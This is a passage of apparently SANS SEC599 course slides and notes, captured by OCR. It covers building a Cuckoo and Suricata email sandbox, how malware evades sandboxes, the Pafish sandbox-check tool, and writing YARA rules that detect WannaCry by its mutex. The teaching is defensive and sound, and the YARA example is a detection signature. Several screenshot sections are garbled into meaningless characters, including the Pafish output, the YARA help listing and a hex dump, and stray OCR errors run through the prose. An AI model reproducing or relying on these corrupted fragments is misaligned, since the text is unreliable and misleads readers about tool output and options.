Cuckoo Installation Cuckoo is well-documented, but can still be difficult to install. The right environment must be selected, and there are many dependencies that have to be installed correctly for Cuckoo to work properly. Cuckoo has a full manual (see URL on the slide above). If you are in a position that you can disclose the samples you want to analyze, there is an online option. Malwr.com runs an instance of the Cuckoo Sandbox and can be used to submit and analyze your samples. Be aware that by default, the samples you submit are downloadable by other malwr users. Finally, there is a script available to facilitate the automatic installation of Cuckoo: it was developed by Buguroo Offensive Security.

© 2017 Erik Van Buggenhout & Stephen Sims

47

A Note About Sandboxing
As we are attempting to defeat advanced adversaries, we have to understand the limitations of sandboxing technologies:
· Advanced payloads could include sand.box detection techniques that will stop payload execution once a sandbox is detected
· Tailored / targeted payloads often even only execute if certain conditions are met (e.g. they check the Windows domain name to ensure they are in the right environment)
· These samples will require manual analysis efforts
Still, malware sandboxes are a good way to effectively identify or block a large volume ofpayload deliveries.
A Note About Sandboxing Sandboxing technologies have certain shortcomings that we have to understand ifwe want to defeat advanced adversaries.
First ofall, certain payloads include various sandbox detection techniques that will stop further execution once a sandbox is detected. This allows the attackers to make sure the payload is only executed on " real environments" and attempts to thwart analysis using a sandbox.
Targeted payloads take it a step further and might only execute in case certain conditions are met. Jnstead of simply verifying whether the environment is not sandboxed, it might also check if they are in the correct real environment, such as the correct domain for example. If the computer's domain name does not match the specified domain, execution will be halted.
Samples that make use of advanced evasion techniques wi ll require additional manual analysis efforts, such as reverse engineering. However, malware sandboxes are still a good way to identify and block the majority of payload deliveries.

48

© 2017 Erik Van Buggenhout & Stephen Sims

Our Cuckoo Setup

r

For our course & exercises, we have set up an Ubuntu-based host with

Suricata installed for SMTP extraction and a fully configured Cuckoo with

a Windows 7 guest (using VirtualBox).

INTERNET*

Suricata / Cuckoo

Mail Server

End-user workstations

· We have included this machine in the course USB as well · Feel free to further build out this machine once you return to the office
(e.g. add additional guest analysis VMs, install additional software...)
:. s.w

Our Cuckoo Setup For this course, we have created a ful I instal I of Cuckoo on an Ubuntu-based host.
It comes with Suricata installed to extract attachments from SMTP and a fully configured Cuckoo Sandbox. This sandbox uses a Windows 7 guest virtual machine (VirtualBox).
You will find this machine on the course USB, and you are invited to further develop this machine for use in your enterprise. You can install additional software, signatures, add guest YMs with other operating systems...
Ifyou add interesting features that work well for your enterprise, we would like to hear from you so that we can further improve this training.

© 2017 Erik Van Buggenhout & Stephen Sims

49

Cuckoo - Additional Resources
Some additional resources that can prove to be useful for Cuckoo sandbox include:
· https: //cuckoosandbox.org/ Cuckoo Sandbox official project page
· https://github.com/x:rne/cuckoomx Cuckoo MX project by Xavier Mertens
· https://malwr.com/ Online Cuckoo setup
· https: //github.com/cuckoosandbox/community Cuckoo community resources
SAN~

Cuckoo - Additional Resources Some additional resources that can prove to be useful for Cuckoo sandbox include:

---

https://cuckoosandbox.org/ Cuckoo Sandbox official project page

https://github.com/xme/cuckoomx Cuckoo MX project by Xavier Mertens

https://malwr.com/ Online Cuckoo setup

https://github.com/cuckoosandbox/community Cuckoo community resources

50

© 2017 Erik Van Buggenhout & Stephen Sims

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertin~ Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SEC599.2
Strategies for Preventing / Detecting Payload Delivery End-User Security Awareness
· Leveraging Suricata IDS/ IPS E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Flrewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

This page intentionally left blank.

© 2017 Erik Van Buggenhout & Stephen Sims

51

Exercise - Building a Sandbox Using Suricata & Cuckoo

·

IThe objectiv~ of the lab is to set up a mail sandbox to detect the attack we launched yesterday using · Suricata for SMTP carving {attachments & URLs) · Automatically analyzing the attachments & URLs with Cuckoo

High-level exercise steps: 1. Configure Suricata to enable SMTP file & URL extraction 2. Writing a script to automatically analyze attachments & URLs using Cuckoo 3. Interpreting the results of Cuckoo

SANS
Exercise - Building a Sandbox Using Suricata & Cuckoo The objective of today's first lab is to implement some of the e-mail security controls we just introduced. We will set up a mail sandbox to detect incoming payloads. We will be using the following technology stay:
Suricata IDS / IPS for SMTP carving (both attachments & URLs should be extracted) Automatically analyzing the extracted attachments & URLs with Cuckoo
As we want to "hit the ground running", we have already prepared a running sandbox environment, which has been described on the next slide.
For additional guidance & details on the lab, please refer to the LOOS workbook.

52

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Building a Sandbox Using Suricata & Cuckoo - Architecture

Mail server with Suricata installed
etho: 192.168.20.10
Suricata SMTP extraction

Cuckoo - Ubuntuo2
CUC~ etho: 192.168.30.15 vboxneto: 192.168.88.1 Win Guest: 192.168.88.15

If you'd like to set up a similar environment in your organization, you'll have to adapt the setup to your architecture / needs, but the techniques and concepts remain exactly the same. For reference, our complete Cuckoo configuration is added on the course USB drives.
, SANS

Exercise - Building a Sandbox Using Suricata & Cuckoo - Architecture For this course, we have created a full install of Cuckoo on an Ubuntu-based host. The course author further reworked the Cuckoo Auto-Install script and included it in the Course USB. Feel free to reuse it or tweak it further. Furthermore, we have installed Suricata IDS / JPS on the mail server, where we will perform both URL and SMT P extraction. Although all required software components are already installed, you will have to perform the final configuration and properly interpret the results.
The Ubuntu C uckoo host has been configured in the following way: IP address 192. 168.30.1 5 (Cuckoo web interface is avai lable at l 92.168.30.15:8000)
· Vi1tualBox has been installed · A Windows VM (Windows 7 32-bit) has been installed & configured in Cuckoo
The mail server has been configured in the following way: · IP address 192.168.20.10 · Suricata has been installed and is listening on the mail server network interface
So, what are the missing parts? · Suricata hasn't been configured tu perform SMTP file & URL extraction · There is no link between Cuckoo & Suricata
In order to increase the added value for attendees, we have added the full solution as virtual machines to the course USB drives.

© 2017 Erik Van Buggenhout & Stephen Sims

53

Exercise - Building a Sandbox Using Suricata & Cuckoo - Bonus (Extra Time )

~N .,nti<dt1bu!Jg-,r/Ul'\i'~..11,dho·> lrick~ ,ud by ~lvAN fo· th11 yrn·ral l>t~bllc.

T·J Uiltdo111 "'·r;1on 1 tt . 7 hu,ld 92-&Kt t,.l CPU: C.nu.ine h1tel
gr:--;;!;4~:l~!':~t.Ueo°::<fN) ,~· S1ua.l CPU Ill l ,2YCH...

l l O.lM1u,1· t-s dr1..i· tton

l·I Utlou h.Ciehl·l'Ju«-rP,...untO

0)(

_..,..-=· ( .. 1 CPU inrON'J.'lion ~Uttd d~crr.tiun

t · J e·,.ckir111 t.1- ._,, . ...

b,.1,.w~·n CVU ,~,.... . t.,..nv vuni"1

l·I CIYr:c..ldn~ tho difference:: bt-twt-n CVll l1.nca tanp ,ou.nlt'r

:~>'Ci.-!ft;;at,peN,Uor hh ln C.11-Uid h,uuro l)lt· · , OK
l · J Cl,.t:k:1w, ()Juhl hvp.,~n.,,. utnrlor Cor J.J1ov11 Un v~octnr·

<1~\Hi. > ··· OIC
<r-tit c) forc.1.n9 Un·· c"cedf

l j C.oedc ··ndboM drtH,t. io"
~=~ ~~~?111":u.~:e:!1!!:ity ·OK OK

"~Ii ""i," l · l Ct.,ckhts, h '" -,.d, ... OK

I .. ) C1..ckin9 cannon · ".nplf" tt,u,·· in dr lvra r"OOt ·· Ok

l · ) C~tkini C· J Checkfo-.,

H if

dn.k ti,·., dlsk -st:.·

<<·

Dc-u1udoControlO ··· OX 68<::ff 11'4 Cr.t.l>hkFrc"S:&·'-t::t:f~O ··

OM

t· I r· l t· I

Chrtckhtu Checkiru, Cheelun9

H
If l(

,1c,ep(> le P'[lt cMd MunberotP1·oc·uor,: Hu,..1,.t-0rP.,.oceu~r:.

u,i:ac1- "1<<1,2Z1vv;nJi-·rt

ldtCot1ntO "'"'" .,i;c. 1-ec~v tenl

.· OK . ·· t..r-acodf
nfo(> . tN

Kedf

}:: g:~=::: ir:~:=~i~;s!;:,;~t:~.. t..l Ched1:in9 11 11y:,u.-,l Mr'IOf'~ 1a ( 1t:t, · ·· t..-.c·dt ~~!~3i~!:(~':°nt~~ . tN.cedr

l I Hoob d ll'!teccion I · I CJ.., )tfn!el f unction $he I 1£x4'1cutef.xV Mtho-1 I ··· Ok r · J f.hf-ckhig f unction Cre11t·l'roces1n net.hod I . Ok

SANS

Pafish & Cuckoomon.dll
Pafish is a free tool by Alberto Ortega, (GPL) which aims to detect sandbox behavior throu~h a variety of techniques.
You can find the latest version on https://github.com/a0rtega/pafish
We can use it to assess the "detectability" of our Cuckoo sandbox. Alberto Ortega also wrote a modified DLL for Cuckoo, thereby reducing its detection rate.

Exercise - Building a Sandbox Using Suricata & Cuckoo - Bonus (Extra Time) Ifyou have time left, here's a nice bonus activity!
As discussed before, Cuckoo sandbox is an excellent tool, though advanced samples will detect they are running in a sandbox and will halt execution. Pafish (Paranoid Fish) is an executable that will run through a series ofchecks to assess whether or not it is being run in a sandbox. We can use it to further optimize our sandbox and reduce the sandbox detection rate. You can find Pafish under the Cuckoo folder on the Windows02 desktop. Try running it our sandbox and observe the output.

54

© 2017 Erik Van Buggenhout & Stephen Sims

Exercise - Building a Sandbox Using Suricata & Cuckoo - Conclusion
During this lab, we built an e-mail security sandbox by relying on the following open-source technology:
Suricata as an IDS to extract SMTP attachments and URLs from
(11,lTA raw network traffic.
cuckoo~ Cuckoo as a sandbox to perform dynamic analysis to analyze
- ~ extracted attachments or URLs for malicious behavior.
Our current sandbox is only focused on detecting incoming payloads and will not BLOCK them automatically. SANS Internet Storm Center Handler Xavier Mertens built the open-source GitHub repository CuckooMX, in an attempt to replicate actual blocking using Cuckoo. It is freely available at https://github.com/xme/cuckoomx.
Exercise - Building a Sandbox Using Suricata & Cuckoo - Conclusion During this lab, we built our very own e-mail security sandbox by relying on the following open-source technology:
· Suricata as an IDS / lPS engine to extract SMTP attachments and URLs from raw network traffic on the mail server;
· Cuckoo as a sandbox to perform dynamic analysis to analyze extracted attachments or URLs for malicious behavior.
As already mentioned during the course, another option is to install dedicated appliances in your environment to implement e-mail security, such as FireEye MX for example. As opposed to our current sandbox configuration, FireEye MX will also attempt to actively block incoming attachments it considers suspicious. An alternative solution for blocking of malicious e-mail attachments is CuckooMX. SANS Internet Stonn Center Handler Xavier Mertens built this open-source GitI-lub repository, in an attempt to replicate actual blocking using Cuckoo. It is freely available at https://github.com/xme/cuckoomx.
Later during the day, we will also investigate dashboarding solutions to help us better monitor the results of Suricata & Cuckoo.

© 2017 Erik Van Buggenhout & Stephen Sims

55

Course Roadmap
· Day 1: Knowing the Adversary, Knowing Yourself
· Day 2: Avertin2 Payload Delivery
· Day 3: Preventing Exploitation
· Day 4: Avoiding Installation, Foiling Command & Control & Thwarting Lateral Movement
· Day 5: Exfiltration, Cyber Deception & Incident Response
· Day 6: APT Defender Capstone

SECS99.2
Strategies for Preventing/ Detecting Payload Delivery End-User Security Awareness Leveraging Suricata IDS / IPS
· E-mail Security Controls Exercise: Building a Sandbox Using Suricata & Cuckoo Zooming in on YARA Rules Exercise: Finding the Needle in the Haystack Using YARA Web Security Controls Exercise: Deploying PfSense Firewall with Squid & ClamAV Stopping Delivery Using Removable Media Visualizing the Results of Our Solutions Exercise: Developing Eye-Candy Using Kibana Controlling Script in the Enterprise Exercise: Controlling Script Using GPO's

This page intentionally left blank.

56

© 2017 Erik Van Buggenhout & Stephen Sims

Introducing YARA
rJIJyara

IYARA is a free, open source tool developed by Vict or M. Alvarez, an employee of VirusTotal.

ILovingly nicknamed " The pattern matching swiss knife for malware researcher s".

Virus Total

IAvailable as stand-alone tool on Windows, Linux, and O SX, and has been integrated into many other tools.
IWe will look at YARA's possibilities to detect payloads being delivered to our organization.

Introducing YARA YARA is a free, open source tool to do pattern matching on files (usual text or binary strings, combined in a condition).
It is developed and maintained by Victor M. Alvarez, an employee ofVirusTotal. YARA rules can be used with YirusTotal Intelligence, to hunt for malware samples.YARA rules can be used to hunt for new, submitted samples, or for existing samples (retrohunt).
YARA uses rules and can scan files or the memory of processes, for matching patterns. YARA rules are written in text, according to a specific syntax and grammar. Essentially, one defines a couple of strings in a rule, and if a file (or memory content) contains these strings, the rule will trigger.
YARA is available as a stand-alone tool for Windows, Linux, and OSX. It comes in 32-bit and 64-bit versions. There are also modules available for programming languages like Python. This allows Python programmers to integrate YARA searching capabilities in their Python program. For example, Didier Stevens' malware analysis tools pdf-parser.py and oledump.py support YARA rules.
The YARA engine has also been intt:grated into numerous tools and products, both free and commercial. A free, open source product with YARA support interesting to us is ClamAV. C lamAY defines its own signature definition language, but the latest versions also support YARA rules.
YARA stands for Yet Another Recursive Acronym or Yet Another Ridiculous Acronym.
http://virustotal.github.io/yara/

© 2017 Erik Van Buggenhout & Stephen Sims

57

Introducing YARA ,,...
fjyara
· Until the release ofYARA, independent malware analysts had no publicly available tool to "easily" detect & classify large volumes of malware samples
· By using rules, YARA provides an engine that can be used by all · YARA rules to detect (new) malware are shared publicly · Since YARA rules are pure text using an easy to understand syntax, they
can be developed and adapted quickly
SAN~
Introducing YARA C lamAVis an open source anti-virus engine, that can be used to define rules to detect malware. ClamAV rules are rather simple, using a syntax that is not very user-friendly. Lacking a bit of flexibility, they don't offer a tool to create powerful rules to analysts.
YARA is an engine to detect malware based on rules. These rules use an expressive language, that is more powerful and offers more flexibility than ClamAV rules. YARA is not an anti-virus scanner. An anti-virus scanner will use signatures (rules) to detect malware and then take action: deleting the file that contains malware or cleaning the file with malware. Deleting can be permanent or with a quarantine. A quarantine is a secure space (folder and fileformat) where malicious files are stored. Cleaning malicious files involves modifying the file content to remove the malicious part. For example, in a malicious Word document using VBA macros, the file can be cleaned by removing the macros and leaving the text of the document intact.
An anti-virus engine supports many file formats, e.g. archive formats like Z IP, RAR ...
YARA has no deletion and cleaning capabilities and does not support archives and other container formats. YARA scans a provided file as-is, and will only report rule triggering, without deletion or alteration ofthe scanned file.
YARA rules are easy to implement and new YARA rules are released to the public regularly, with each outbreak ofa new type of maIware. Several anti-virus vendors have adopted the habit of including YA RA rules in the malware analysis reports they publish. There are several YARA repositories on G ill lub, and the Yara.Rules Project is an organization dedicated to the sharing ofYARA rules (http://yararules.com/).

58

© 2017 Erik Van Buggenhout & Stephen Sims

--

YARA File Analysis

YARA File Analysis The YARA engine can be used to analyze files on a file system.
YARA requires at least one input file to analyze, and one rule file. The input file can be anything. The ru le file is a text file containing at least one rule written according to the YARA syntax and semantics for rules.
YARA leaves the input files (and rule files) unchanged when analyzing its input, and produces a report mentioning detections. A detection is when a rule "matches" a particular file. By default, YARA will only produce output for rules that detect something. This behavior can be changed with YARA options.
YARA can be instructed to scan many tiles (including a complete disk by recursing into the directories), with many rules. The YARA engine will try to match all rules on all files, but this scanning method can also be configured, for example, to stop scanning a file after a first rule matches.

© 2017 Erik Van Buggenhout & Stephen Sims

59

YARA Engine and Rules
YARA is a free, open source tool used to detect and analyze malware
· YARA provides a rule-based approach to detecting malware · YARA's engine supports strings, binary data, and regular expressions · Rules search for these strings, binary data, and/or regexes · Rules have a Boolean condition to decide based on search results · YARA provides modules for file types like PE and ELF
SA~
YARA Engine and Rules As explained in the previous slide, the YARA engine takes ti les and rules as input to produce a report as output.
Rules are written with a text fi le, using a syntax that resembles programming languages like Perl and C. A rule can define strings, binary data and regular expressions to be used for the matching of the rule against input files. A least one search term (a string, binary data or regular expression) needs to be defined in the rule .
The YARA engine will then proceed with the analysis ofthe files submitted to it and search for the strings, binary data and/or regular expressions.
Each rule needs a condition: this is a Boolean expression using a powerful expression language, defining how the found search terms need to be combined for the rule to trigger. For example, in YARA it is possible to write a rule that looks for 5 different strings and triggers (i.e. the condition is true) when at least 3 strings are found inside the scanned file.
Rules can also have metadata and comments. This is not mandatory.
Although the YARA engine is file agnostic, it comes with a few modules to support extra matching capabilities for particular fi le formats, like the executable file formats PE file (Windows) and ELF (Linux). For example, with the PE module, it is possible to write a rule that triggers when a section is present with a particular name.

60

© 2017 Erik Van Buggenhout & Stephen Sims

YARA - Example of a Simple Rule (I)

, Name of the YARA rule

rule wcry_rnutex {

String to be searched for

strings:

Smutex = "MsWinZonesCacheCounterMutexA"

condition : Smutex

}

YARA - Example of a Simple Rule (1) This is an example of a simple YARA rule.
A YARA rule starts with the reserved keyword rule and has a name (wcry_ mutex in this example). This name must be unique when more than one rule is used by the YARA engine (several rules can be defined in the same YARA rule file). The name is followed by the definition of the rule between curly braces.
A YARA rule has different "sections". A section is a reserved keyword followed by a colon(:). 2 sections are mandatory: strings: and condition:.
The strings: section lists strings (text and binary) that the YARA engine will search for in the submitted files. In this example, we define one string: $mutex . The value of$mutex is "MsWinZonesCacheCounterMutexA".
The condition: section defines an expression that states what strings must be found and under what conditions, for the rule to trigger. In this simple example, the condition is just $mutex. This means that the string defined in $mutex must be found at least once in the scanned files for the rule to trigger.
The example we are giving here is fur Lhe detection ofthe WannaCry mnsomware wonn that wreaked worldwide havoc in May 2017.

© 2017 Erik Van Buggenhout & Stephen Sims

61

YARA - Example of a Simple Rule (2)

Iii

SEC599

Using the 64-bitYARA scanner with rule wcry.yara on a file

When a match occurs, the name of the rule and the name of the
analyzed file is produced as output

No output is produced if the rule does not match
·
C:\O··o>yara6~ wcry . yara 8~c8283Sa5d21bbcf7Sa61786d8ab5~9 . vir
C: \0-· o>

YARA - Example of a Simple Rule (2) After defining this rule, and saving it in a file (wcry.yara), we can use it with the YARA engine to scan files.
ln this example, we use the 64-bit YARA scanner on Windows (yara64.exe) to scan a sample ofthe WannaCry ransomware. We see that this command produces one line ofoutput: wcry_ mutex "name of the file". This means that rule wcry_ mutex triggered on the provided malware sample.
If no rules would trigger, then no output would be provided. YARA produces a line of output per rule and file combination that triggered.

62

© 2017 Erik Van Buggenhout & Stephen Sims

YARA- Example of a Simple Rule (3)

·

SEC599

C:\Demo>strings 84c82835a5d21bbcf75a61706d8ab549 .vir I findstr /i mutex
OpenHutexA Global \Hs~in2onesCacheCounterHutexA

C:\Oe11O>

In the screenshot above, we are obtaining the information (lOCs) to buildYARA rules. Particular strings (e.g. registry keys created, PDB paths...) are excellent input for theYARA engine.We will discuss automated creation of YARA rules later!

YARA - Example of a Simple Rule (3) We need information to build our own YARA rules. For common malware, we can rely on Indicators Of Compromise published in reports and analysis ofmalware (sometimes these reports will contain YARA rules that can just be copied).
Many lOCs for the WannaCry ransomware worm were published. One of them was a mutex: MsWinZonesCacheCounterMutexA. A mutex is a Windows object that is used for process synchronization. Mutexes are often used in malware, to prevent the malware from having several running instances on the same machine. Mutexes have a name (a string), and the WannaCry worm used MsWinZonesCacheCounterMutexA. This mutex was published in several reports, for example in Kaspersky's initial analysis.
But for the attacks that we face from persistent adversaries, we will often not be able to rely on open source (or closed source) intelligence for lOCs. We will have to find our own JOCs to create our own YARA rules.
Reverse engineering ofsamples will yield enough lOCs, but reverse engineering can be a daunting task. ln this simplistic example of the WannaCry worm, we just dump the strings inside the sample (using the strings command from Microsoft Sysintemals) and filter out strings with the word mutex.

YARA - Options

·

SEC599

C; \0HO)IIJ¥9'fl ·h VARA 3 , 5 , 8 , tM ptthrn Htch1ng 11wiH ·r·w k.n1,.. U··9· ~.,.· (OPTION) RULE$_FILE FILE I DIA I PIO

Kanoatory vgua.nh to long option, .,.. ··ndltory for ~ot't options too

· t . ·· l69lTAG ·i. ··idffllifi.,-.-JOENTU'IER ·n. ··n.g·U
-o. ··pnnt·aodul··Nte ·g. ··pr-ant·teg,
· · . ··pri.nt·Nta ··. --pr1.nt·etr1-ngt
··· ·-pr-int'"MM>&pace ·p. ··thr·ad·'N0H8EA · I . ··Hx·rulH·HUH8ER ·d UARrUALIJE
·x NOOUL[tFILE ·e. ··ti·HUt·S:ECONOS ·k. · ·otack·dn1.SL0T$ ·r . · ·rK.urs.h,· ·f. · ·f··t ·scen ·w. ··no·warnings ·v. ··u.,-lion ·h. ··l,elp

pn.nt only rulH hg,g.-d ae TAG
print on!~ rulH nMod IDOITIFIER print onlw Mt ··tiefiff rulH (n·9·l·) pdnt · odul· data print tag·
print Hta&ue
print Hlching · tdngs print rul·· · ,_....fpau
Uf.· tM ll)Kifi.O HUNBEA ot thrHdt to ·c·n · dfr·ctory ebort ac..nning eftw- Htching a NUHet:A: of rul·· d9fine ·-xt.,..nal U.,.labl·
P6H fILE"e c,ontfflt H ·11tr· dat· to NOOU.£
··t .. ~ t ecwwung ·ft·r tM g.h.1·n rw.b·r of UCOHOS xt-.i· ·teck ab· (fffa.ult·Ulloll) r· curtiu· l~ · · arch dir· ctod·· htt aatching ~
dhabl· warning· ·how u.r,ton inforNtion ·how t.hie M lp and nit

SAN~

YARA o ptio ns & fe a t ures
By requesting the YARA help page (·h), we obtain a full overview of different features supported by YARA. Some examples include:
· Scan a file (basic) · Scan a directory · Scan a process
Let's investigate some of these options!

YARA - Options The YARA tool has many options. Jn our example, we just provided a rule file and a file to scan, but that is just the simplest use ofYARA.
YARA can scan directories (DIR), and scan the memory ofa process (PID).
YARA has also many options. A couple of options we will look into, are - s (--print-strings) and - r (-recursive).

64

© 2017 Erik Van Buggenhout & Stephen S ims

I
YARA - Useful Options ( I)

·

SECS99

C: \Oe· o>yara6~ -s wcry . yara 8~c82835aSd21bbcf7Sa61786d8ab5~9.uir wcry_· utex 8~c82835a5d21bbcf75a61786d8ab5~9.uir 8xf~bb : $· utex: HsWinZonesCacheCounterHutexA

C:\Oe· o>

·

SEC599

C:\De· o>yara6~ wcry . yara wcry_· utex . \wcry . yara wcry_· utex . \8~c82835a5d21bbcf75a61786d8ab5~9 . uir

C:\Oe· o>

Printing out strings
Using option -s to print out all found strings.This can be helpful to debug a rule or to start analyzing a sample.
Scanning a directory
By referencing a directory as the target.YARA will scan all the files inside the directory (but will not recurse in sub-directories)

YARA - Useful Options ( 1)
Using option - s, we can instruct YARA to print out all the instances or the strings 1t finds.
The output in this example starts with a hexadecimal address: 0xf4bb $mutex. This tells us that for the triggered rule wcry_ mutex, the string defined with $mutex was found at location 0xf4bb inside the scanned file.
Knowing which strings were found, can help use debug or fine-tune our rule. In this example, our rule contains just one string, but soon we will see examples with more than one string.
The YARA scanner can be instructed to scan more than one fi le. This can be done by providing the name of the directory to scan as argument (DIR). In the example above, we scan all the files in the current directory(.). We can see that this scan triggered on the WannaCry sample, but also on our YARA rule wcry.yara.
This should not be a surprise, the YARA engine scans all the files in the di rectory, and our rule file wcry.yara contains the string "MsWinZonesCacheCounterMutexA", hence it will trigger the rule too. This is a false positive (and unwanted detection), which we will deal with later.

© 2017 Erik Van Buggenhout & Stephen Sims

65

YARA - Useful Options (2)

Scanning a complete drive
We can use option -r to recurse into the subdirectories. Depending on the number of files in the drive. this can take a long time.

·

SEC599

C:\De· o>yare6q -r wcry . yara c : \ wcry_autex c.\\Oe· o\wcry. yara
w-ccry_· utex c · \\De· o\8qc8283SaSd21bbcf7Sa61786d8abSq9, u1r
C:\De· o>

Scanning memory
The YARA scanner can also scan the memory of processes.This requires the necessary rights and privileges.

·

SECS99

C:\De· o>yara6q wcry. yara sesq can not attach to proc··· (try running as root)

C:\De· o>yara6~ wcry. yare 10812

C:\De· o>

SAN~

YARA- Useful Options (2) YARA can al:su bt: used to scan a complete drive. T his is achieved by providing the root path to the drive (c:\ in our example), and by using option - r to recurse into the subdirectories. To scan all files, the YARA scanner must be started with sufficient rights and privileges to access all files (for example by scanning as administrator and with an elevated process). This can take many hours. sometimes more than a day, depending on the number and size of the files. It is thus something you probably don't want to do in real-time.
YARA can also scan the memory of processes (running programs). This is done by passing the process ID (PIO) as argument to YARA. YARA must have the privileges to open the process (see example above), for example by running as administrator and elevated. Scanning the memory ofa process can help detect strings that are obfuscated or encrypted while at rest in the executable file (PE file), but are in clear-text in memory.

66

© 2017 Erik Van Buggenhout & Stephen Sims

YARA Rule Modifiers (I)
Text (strings) can be encoded using different methods inside a file
· If each character in a string takes up exactly one byte, we have an ASCII string
· By default, YARA searchers for ASCII strings · Ifeach character in a string takes up more than one byte, we have a
UNICODE string · YARA searchers for UNICODE strings when we use the modifier "wide" · String scanning can be case-insensitive using modifier "nocase"
YARA Rule Modifiers (1) Scanning for strings inside a file, the YARA engine will look for bytes, and not characters. The characters in the string we search for, have to be converted to their binary equivalent (one or more bytes) before they can be searched for. By default, YARA will search for ASCII strings if we provide it with a rule with a string, as we did in our first example. ASCJI strings take up exactly one byte per character. For example, character A is encoded with byte 0x4 I in ASCII. Using just one byte to encode a character offers only 256 possibilities, which is by no means sufficient to encode all the characters we have in all the languages used worldwide. Think about the thousands of characters used in the Japanese and Chinese language and all the emoticons that have become popular with smartphones.
New encoding standards were developed to accommodate this multitude of characters. The UNICODE standard provides different encoding schemes. In YAKA, a UNICODE string is defim:<l in a rule by using modifier "wide". For the YARA engine, a UNICODE string is composed of2 bytes per character: character A is encoded as 0x00 0x41. By default, string searches are case-sensitive: searching for string "Test" will not match byte sequence "test" in a file, only byte sequence "Test". To define a case-insensitive search, we use modifier "nocase".

© 2017 Erik Van Buggenhout & Stephen S ims

67

YARA Rule Modifiers (2)

rule wcry_rnutex {

Using modifier wide to search for UNICODE strings

strings:

Srnutex = "MsWinZonesCacheCounterMutexA" wide

condition:

Srnutex

Scanning the sample with the UNICODE definition does not trigger our rule.
The sample contains the ASCII variant of the string and not the UNICODE variant.

·

SEC599

C:\D··o>yara6~ wcry . yara 8~c82835aSd2lbbcf75a61786d8ab5~9 uir C: \Deao >

SAN~

YARA Rule Modifiers (2) When we modify our example rule by adding modifier "wide" to the definition ofstring $mutex, YARA will search for a UNICODE string.
As the WannaCry sample contains no UNICODE encoded string " MsWinZonesCacheCounterMutexA" (only ASCI I encoded), our rule will not trigger.
But still, it is useful to be able to search for different encoding schemes, because variants of the malware might show up that use UNICODE instead ofASCII.
One could think that we have to create 2 separate rules, one for ASCII and one for UNICODE, to cover the different variants. This is indeed a solution, but YARA uses a flexible rule language and offers a better solution: more than one rule modifier can be used per string.

68

© 2017 Erik Van Buggenhout & Stephen Sims

YARA Rule Modifiers (3)

The string itself remains the same

Using more than one modifiers: ascii, wide and nocase.

cule wcry_mutex { .string.s: Smutex · "M.sWinZone.sCacheCounterMutexA" ascii wide nocase
condition : Smutex

Scanning the folder with the modified definition does trigger our rule on the sample. and on the rule file itself.
This is undesired. we need to prevent this by updating our rule.

·

SEC599

C:\Oe· o>y11ra6'1 wcry . yara wcry_· utex . \wcry . yara wcry_· utex . \8'1c8283SaSd21bbcf7Sa61786d8ab5'19 .vir

C:\Oe· o)

SAN~
YARA Rule Modifiers (3) To cover as many possible encoding cases as possible, we can use more than one modifier when defining our string $mutex.
In this example, we instruct YARA to search for both ASCII and UNICODE encodings of our string by appending keywords "ascii" and " wide" to the definition of string $mutex. We do not have to modify the definition ofthe string itself. We also make the search case-insensitive, by using keyword "nocase".
When we use this modified rule to scan all the files in our folder, the rule will trigger, as expected, on our sample file.
But the rule also detects the rule file itself. This should not be unexpected because the rule file itself also contains the string "MsWinZonesCacheCounterMutex.A". One would say that we have not been very careful, that we should not scan our own rule. And that is true. But there can be other undesired detections once we start scanning all files on a computer. For example, this mutex string will be mentioned as an IOC in many malware analysis reports covering WannaCry. These reports could be present on a machine, for example in HTML (as cached Internet Explorer files) or in PDF as a saved report.
To prevent these detections, we need to make sure that we only look for this string inside Windows executable files and not other types offiles. This too can be done with YARA rules.

© 2017 Erik Van Buggenhout & Stephen Sims

69

YARA Fine-Tuning Rules

OOOOh1 ,o SA 90 00 Ol 00 00 00 OC 00 00 00 rr rr 00 00
OOluh: 118 00 00 00 00 00 00 00 ,o 00 00 00 00 00 00 00 0020h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
gg:i:: :~ ~~: ~~ gg ~~ :~ ~g g~ :~ :~ :~ ;~ ~~ ~::
0050h: E9 '1l 20 70 '12 er ti1 72 61 to 20 t,J U t.t E£ t;F
OOeOh: H zo 62 I 5 20 l2 ,s U zo H 61: zo U U SJ :10
0010h: ·~ If · C 15 :1£ OD OD ~AH 00 00 00 00 00 00 00
,a ,a 0090h: a ZC U 00 8A "' El> S) IA CD tD U IA co W Sl
OOtoh: U, "11 SJ I ll Ct; Ui ~, ES la ll 5l Ct> !!) S.3
OOJl0h: &S la n SJ 99 ,o U> S) ES ]8 h U II CD £D SJ ooaoh: 8) lS 7E ll 99 ,o EC, ll GA ,o t: 6l Al CD ltD SJ OOCOh : &a )8 42 S.3 88 co EDS) E.S 18, 77 SJ ·n ,o E.D SJ
OOOOhi !ft l& 70 SJ: 88 40 EO 5,) '.i2 t"9 61 ·8 IA 4!> ED !tl
OOEOh : 00 00 00 00 00 00 00 00 50 CS 00 00 C 01 OS 00
OOf Ob: U al II sg 00 00 00 00 00 00 00 00 £0 00 02 01

IU ·. · ·· ·

I) A Window s executable starts w ith " MZ"

::::.·.11 .. ~tiTh
U FfO\Jt'UII C.41'\hO t be run In DOS
aod4, . .·s.... , .. ,.,.$1<1sS.-.1s!a<JS
1,q$ ~1Sl:3Sc~j· A,GS"MIS1:F$·M1s
,s-se.1<1SSH1S;MIS i ,J\~'M1t;;).,..,c;,~f),
.\1p..">cMiSRic.h!.'<iS .. , ·· .. ,f1:·· I.· ·· 1 1 ,Y········a ···

3) Our updat ed rule only triggers on

rule ~cry_mutex I strings: SMZ " MZ " Smutex · "MsWinZonesCach~CounterMutexA" asci1 wide nocase
con<lition: SHZ at O and $11Utex

executables with the mutex strtng

2) In our rule. we update the condition to check if the file starts with " MZ"
SANS

